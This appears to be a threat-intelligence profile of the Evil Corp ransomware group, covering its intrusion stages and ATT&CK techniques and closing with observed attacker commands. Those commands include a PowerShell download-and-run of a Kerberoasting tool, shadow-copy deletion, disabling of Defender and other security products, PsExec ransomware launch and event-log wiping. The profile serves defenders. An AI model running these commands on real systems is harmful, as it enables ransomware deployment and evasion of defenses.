---
cover: ../../.gitbook/assets/Killing The Bear - Evil Corp.png
coverY: 353.61867704280155
---

# Tactics

## Resume

### Initial Compromise and Establish Foothold

Evil Corp has primarily gained access to victim organizations via FAKEUPDATES infections that ultimately deliver loaders to deploy BEACON samples on impacted hosts. The loader portion of Evil Corp Cobalt Strike payloads have changed frequently but they have continually used BEACON in most intrusions since 2020. Beyond FAKEUPDATES, Mandiant has also observed Evil Corp leverage suspected stolen credentials to obtain initial access. Evil Corp has actually built a framework around this capability, referred to as SocGholish.

Darktrace detected different C2 domains being contacted after the initial infection. These domains overlap across various victims, showing that the attacker is reusing infrastructure within the same campaign. The C2 communication – comprised of thousands of connections over several days – took place over encrypted channels with valid SSL certificates. No single infected device ever beaconed to more than one C2 domain at a time.

During 2021, Evil Corp leveraged publicly available loaders, including [DONUT](https://github.com/TheWover/donut), to deploy BEACON payloads; however, intrusions observed since late 2021 have used the COLORFAKE (aka Blister) dropper.

In recent Evil Corpintrusions where COLORFAKE was used, Mandiant recovered JavaScript artifacts showing the initial delivery of COLORFAKE payloads via FAKEUPDATES. The payloads to be downloaded each have a "fileid" value that FAKEUPDATES will retrieve and write to disk

### Escalate Privileges

Evil Corp has taken multiple common approaches to privilege escalation across its intrusions, including Mimikatz and Kerberoasting attacks, targeting authentication data stored in the Windows registry, and searching for documents or files associated with password managers or that may contain plaintext credentials.

* Uses service account to extract copies of "Security" registry hives
* Uses Mimikatz and performed Kerboroasting attacks
* Searched for terms including:
  * keep
  * avamar
  * kdb
  * netapp
  * pass
  * passw
* Uses Keethief and SecretServerSecretStealer and kather key material from KeePass and decrypt secrets from Thycotic Secret Server

### Internal Reconnaissance

Following Evil Corp FAKEUPDATES infections, Mandiant commonly saw a series of built-in Microsoft Windows utilities such as _whoami, nltest, cmdkey,_ and _net_ used against newly accessed systems to gather data and learn more about the victim environment.

* Executed the Advanced Port Scanner utility.
* Downloaded and installed the asset management tool Lansweeper
* Access to VMware VCenter to see information about host configurations, clusters and storage
* Access to TrendMicro OfficeScan management console to see admin roles and config

Evil Corp used Advanced Port Scanner, a common IT tool, in a clear attempt to blend in with regular network activity. Several hundred IPs and dozens of popular ports were scanned at once, with tens of thousands of connections made in a short period of time.

Some key ports scanned were: **21, 22, 23, 80, 135, 139, 389, 443, 445, 1433, 3128, 3306, 3389, 4444, 4899, 5985, 5986, 8080**.

### Lateral Movement and Maintain Presence

Different methods of lateral movement were observed across intrusions, but also within the same intrusion, with WMI used to move between devices.&#x20;

PsExec was used where it already existed in the environment and Darktrace also witnessed SMB drive writes to hidden shares to copy malware

Heavy rely on Cobalt Strike BEACON. Also used common admin protocols and software to enable lateral movement, including RDP and SSH (PuTTy).

* Creation of local system accounts and added them to groups including local admin and RDP users
* Maintained access via its corporate VPN infraestructure

### Complete Mission - Data exfiltration or Ransom deploy

Stolen data from victims to use as leverage for extortion after it has deployed ransomware across an environment. In intrusions where the data exfiltration method could be identified, there is evidence to suggest the group used either Rclone or MEGASync to transfer data from the victims' environments prior to encryption.

Multiple Windows batch scripts leveraged during the final phases of the operations to deploy ransomware and modify systems to aid the ransomware's propagation. Mandiant observed that Evil Corp use both HADES and LOCKBIT

* Uses of a script that forces Group Policy updated and adds all files with EXE, BAT or DLL extensions and the `C:Programdata` and `C:Windows` directories to the Windows Defender exclusions list
* WMI to stop and uninstall anti-virus products and other Windows Services prior to ransomware deployment
* Scripts to modify multiple Windows Registry keys with an aim to remove some barriers to ransomware execution and disable utilities commonly used by administrators such as the Windows task manager, registry tools, and the command prompt
* Ransomware execution script that initiates the encryption process using PSEXEC. This script also disables Windows Defender and clears the Windows event logs

Darktrace observed data exfiltration took place over HTTP to generic .php endpoints under the attacker’s control too.

![The standard attack lifecyle observed in Evil Corp campaigns - Darktrace (Aug 2020)](<../../.gitbook/assets/imagen (2).png>)

![KillChain - Truesec (May 2021)](<../../.gitbook/assets/imagen (1).png>)

## TTPs

### Impact

* T1486: Data Encrypted for Impact
* T1489: Service Stop
* T1490: Inhibit System Recovery
* T1529: System Shutdown/Reboot

### Defense Evasion

* T1027: Obfuscated Files or Information
* T1027.005: Indicator Removal from Tools
* T1036: Masquerading
* T1055: Process Injection
* T1055.002: Portable Executable Injection
* T1070.001: Clear Windows Event Logs
* T1070.004: File Deletion
* T1070.005: Network Share Connection Removal
* T1070.006: Timestomp
* T1078: Valid Accounts
* T1112: Modify Registry
* T1127.001: MSBuild
* T1134: Access Token Manipulation
* T1134.001: Token Impersonation/Theft
* T1140: Deobfuscate/Decode Files or Information
* T1202: Indirect Command Execution
* T1218.005: Mshta
* T1218.011: Rundll32
* T1497: Virtualization/Sandbox Evasion
* T1497.001: System Checks
* T1553.002: Code Signing
* T1562.001: Disable or Modify Tools
* T1562.004: Disable or Modify System Firewall
* T1564.003: Hidden Window
* T1620: Reflective Code Loading

### Command and Control

* T1043: Commonly Used Port
* T1071: Application Layer Protocol
* T1071.001: Web Protocols
* T1071.004: DNS
* T1090.004: Domain Fronting
* T1095: Non-Application Layer Protocol
* T1105: Ingress Tool Transfer
* T1573.002: Asymmetric Cryptography

### Collection

* T1005: Data from Local System
* T1039: Data From Network Shared Drive
* T1056.001: Keylogging
* T1113: Screen Capture
* T1115: Clipboard Data
* T1560: Archive Collected Data
* T1602.002: Network Device Configuration Dump

### Discovery

* T1007: System Service Discovery
* T1010: Application Window Discovery
* T1012: Query Registry
* T1016: System Network Configuration Discovery
* T1018: Remote System Discovery
* T1033: System Owner/User Discovery
* T1049: System Network Connections Discovery
* T1057: Process Discovery
* T1069: Permission Groups Discovery
* T1069.001: Local Groups
* T1069.002: Domain Groups
* T1082: System Information Discovery&#x20;
* T1083: File and Directory Discovery&#x20;
* T1087: Account Discovery&#x20;
* T1087.001: Local Account&#x20;
* T1087.002: Domain Account
* T1135: Network Share Discovery
* T1482: Domain Trust Discovery
* T1518: Software Discovery
* T1614.001: System Language Discovery

### Privilege Escalation

* T1055: Process Injection
* T1078: Valid Accounts

### Lateral Movement

* T1021.001: Remote Desktop Protocol
* T1021.002: SMB/Windows Admin Shares
* T1021.004: SSH
* T1028: Windows Remote Management
* T1076: Remote Desktop Protocol

### Exfiltration

* T1002: Data Compressed
* T1020: Automated Exfiltration
* T1048: Exfiltration Over Alternative Layer Protocol

### Execution

* T1047: Windows Management Instrumentation
* T1053: Scheduled Task/Job
* T1053.005: Scheduled Task
* T1059: Command and Scripting Interpreter
* T1059.001: PowerShell
* T1059.003: Windows Command Shell
* T1059.005: Visual Basic
* T1059.007: JavaScript
* T1569.002: Service Execution

### Persistence

* T1050: New Service
* T1078: Valid Accounts
* T1098: Account Manipulation
* T1136: Create Account
* T1136.001: Local Account
* T1543.003: Windows Service
* T1547.001: Registry Run Keys / Startup Folder
* T1547.009: Shortcut Modification

### Credential Access

* T1003.001: LSASS Memory
* T1003.002: Security Account Manager
* T1110: Brute Force
* T1552.002: Credentials in Registry
* T1558: Steal or Forge Kerberos Tickets
* T1558.003: Kerberoasting

### Initial Access

* T1133: External Remote Services
* T1189: Drive-by Compromise

### Resource Development

* T1588.003: Code Signing Certificates
* T1588.004: Digital Certificates
* T1608.003: Install Digital Certificate

### Impact

* T1486: Data Encrypted for Impact
* T1489: Service Stop

## Behaviour

### Hades

```
C:\Windows\system32\vssadmin.exe Delete Shadows /All /Quiet
C:\Users\Admin\AppData\Roaming\CenterLibrary\Tip /go
cmd /c waitfor /t 10 pause /d y & attrib -h
“C:\Users\Admin\AppData\Roaming\CenterLibrary\Tip” & del “C:\Users\Admin\AppData\Roaming\CenterLibrary\Tip” & rd “C:\Users\Admin\AppData\Roaming\CenterLibrary\”
waitfor /t 10 pause /d y
attrib -h “C:\Users\Admin\AppData\Roaming\CenterLibrary\Tip”
```

### WastedLocker

```
C:\Windows\system32\vssadmin.exe Delete Shadows /All /Quiet
cmd /c choice /t 10 /d y & attrib -h
“C:\Users\Admin\AppData\Roaming\Wmi” & del “C:\Users\Admin\AppData\Roaming\Wmi”
C:\Users\Admin\AppData\Roaming\Wmi:bin -r
C:\Windows\system32\WindowsPowershell\v1.0\powershell.exe Set-Mp-Preference -DisableBehaviorMonitoring $true ; Set-MpPreference -MAP-SReporting 0 ; Set-MpPreference -ExclusionProcess rundll32.exe ; Set-Mp-Preference -ExclusionExtension dll
C:\Windows\System32\netsh.exe advfirewall firewall add rulename=”Rundll32′′ dir=out action=allow protocol=anyprogram=”C:\Windows\system32\rundll32.exe”
```

### PhoenixLocker

```
C:\Users\Admin\AppData\Roaming\SetupPlay8\Dev /go
cmd /c waitfor /t 10 pause /d y & attrib -h “C:\Users\Admin\AppData\Roaming\SetupPlay8\Dev” & del “C:\Users\Admin\AppData\Roaming\SetupPlay8\Dev” & rd “C:\Users\Admin\AppData\Roaming\SetupPlay8\”
waitfor /t 10 pause /d y
attrib -h “C:\Users\Admin\AppData\Roaming\SetupPlay8\Dev” 
“C:\Windows\system32\NOTEPAD.EXE” C:\Users\Admin\Desktop\PHOENIX-HELP.txt
```

### PayloadBin

```
vssadmin.exe Delete Shadows /All /Quiet
wmic process call create “%s” > nul && exit
C:\Users\Admin\AppData\Roaming\SetupPlay8\Dev /go
cmd /c waitfor /t 10 pause /d y & del “C:\Users\Admin\AppData\Roaming\SetupPlay8\Dev” & rd
“C:\Users\Admin\AppData\Roaming\SetupPlay8\”
waitfor /t 10 pause /d y
```

### Download Kerberoasting from GitHub

```
cmd.exe /C cmd /c powershell -nop -exec bypass -c iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1'); PowerSharpPack -Rubeus -Command "kerberoast"
```

### Recon commands

```
cmd.exe /C powershell /c nltest /dclist: ; nltest /domain_trusts ; cmdkey /list ; net group 'Domain Admins' /domain ; net group 'Enterprise Admins' /domain ; net localgroup Administrators /domain ; net localgroup Administrators

cmd.exe /C powershell /c "Get-WmiObject win32_service -ComputerName localhost | Where-Object {$_.PathName -notmatch 'c:win'} | select Name, DisplayName, State, PathName | findstr 'Running'"
```

### Script forcing Group Policy update

```
gpupdate /force
powershell.exe -command Add-MpPreference -ExclusionExtension ".bat"
powershell.exe -command Add-MpPreference -ExclusionExtension ".exe"
powershell.exe -command Add-MpPreference -ExclusionExtension ".dll"
powershell.exe -command Add-MpPreference -ExclusionPath "C:Programdata"
powershell.exe -command Add-MpPreference -ExclusionPath "C:Windows>"
```

### Script to uninstall antivirus products

```
wmic product where name="CarbonBlack Sensor" call uninstall /nointeractive
wmic product where name="Carbon Black Sensor" call uninstall /nointeractive
wmic product where name="Carbon Black Cloud Sensor 64-bit" call uninstall /nointeractive
wmic product where name="CarbonBlack Cloud Sensor 64-bit" call uninstall /nointeractive
wmic product where name="Cb Defense Sensor 64-bit" call uninstall /nointeractive
wmic product where "name like '%%Cb Defense%%'" call uninstall /nointeractive
wmic product where name="Dell Threat Defense" call uninstall /nointeractive
wmic product where name="Cylance PROTECT" call uninstall /nointeractive
wmic product where name="Cylance Unified Agent" call uninstall /nointeractive
wmic product where name="Cylance PROTECT - Dell Plugins" call uninstall /nointeractive
wmic product where name="Microsoft Security Client" call uninstall /nointeractive
wmic product where name="LogRhythm System Monitor Service" call uninstall /nointeractive
wmic product where name="Microsoft Endpoint Protection Management Components" call uninstall /nointeractive
wmic service where "caption like '%%LogRhythm%%'" call stopservice
wmic service where "caption like '%%SQL%%'" call stopservice
wmic service where "caption like '%%Exchange%%'" call stopservice
wmic service where "caption like '%%Malwarebytes%%'" call stopservice
```

### Script to edit the Windows Registry

```
reg add "HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer" /f /v "HidePowerOptions" /t REG_DWORD /d 1
reg add "HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesExplorer" /f /v "HidePowerOptions" /t REG_DWORD /d 1
reg add "HKCUSoftwarePoliciesMicrosoftWindowsExplorer" /f /v "DisableNotificationCenter" /t REG_DWORD /d 1
reg add "HKCUSoftwareMicrosoftWindowsCurrentVersionPushNotifications" /f /v "ToastEnabled" /t REG_DWORD /d 0
reg add "hklmsystemcurrentcontrolsetcontrolStorage" /f /v "write Protection" /t REG_DWORD /d 0
reg add "hklmsystemcurrentcontrolsetcontrolStorageDevicePolicies" /f /v "writeprotect" /t REG_DWORD /d 0
reg add "hklmsystemcurrentcontrolsetServicesLanmanServerParameters" /f /v "AutoShareWks" /t REG_DWORD /d 1
reg add "hklmSOFTWAREMicrosoftWindowsCurrentVersionPoliciessystem" /f /v "LocalAccountTokenFilterPolicy" /t REG_DWORD /d 1
reg add "HKLMSoftwarePoliciesMicrosoftWindows DefenderUX Configuration"  /v "Notification_Suppress" /t REG_DWORD /d "1" /f
reg add "HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f
reg add "HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem" /v "DisableCMD" /t REG_DWORD /d "1" /f
reg add "HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f
reg add "HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer" /v "NoRun" /t REG_DWORD /d "1" /f
```

### Script to execute LOCKBIT binary

```
cd c:&PsExec.exe -accepteula -d -h -high -u .<USERNAME> -p "<PASSWORD>" c:<RANSOMWARE_BINARY>.exe
cd c:&PsExec.exe -accepteula -d -h -i -high -u .<USERNAME> -p "<PASSWORD>" c:<RANSOMWARE_BINARY>.exe
cd c:&PsExec.exe -accepteula -d -h -u .<USERNAME> -p "<PASSWORD>" c:<RANSOMWARE_BINARY>.exe
cd c:&PsExec.exe -accepteula -d -h -i -u .<USERNAME> -p "<PASSWORD>" c:<RANSOMWARE_BINARY>.exe
tasklist | findstr /i <RANSOMWARE_BINARY> > <REDACTED><REDACTED><REDACTED>%COMPUTERNAME%.txt
cmd.exe /c "C:Program FilesWindows DefenderMpCmdRun.exe" -RemoveDefinitions -All
sc stop WinDefend
sc config WinDefend start= disabled
sc delete WinDefend
for /F "tokens=*" %%1 in ('wevtutil.exe el') DO wevtutil.exe cl "%%1"
```
